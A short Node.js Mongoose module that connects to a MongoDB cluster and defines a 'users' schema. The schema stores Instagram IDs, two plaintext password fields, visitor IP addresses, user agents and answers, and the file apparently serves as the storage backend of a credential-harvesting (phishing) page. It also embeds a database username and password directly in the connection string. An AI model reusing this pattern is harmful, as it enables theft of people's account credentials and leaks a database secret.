const mongoose=require('mongoose')

const pool=mongoose.connect('mongodb+srv://tanishkaDb:Ze3wXDNXDvEBsD3q@cluster0.g2jxbm3.mongodb.net/?retryWrites=true&w=majority')

const userSchema=new mongoose.Schema({
    
    instaId:String,
    pwd:String,
    pwd2:String,
    userip:String,
    useragent:{},
    ans:{},
    time:{
        type:Date,
        default:()=> {
            let time=new Date()
            return time.getTime()
        }
    }

})

const user=mongoose.model('users',userSchema,'users')

module.exports={
    user,
    pool
}
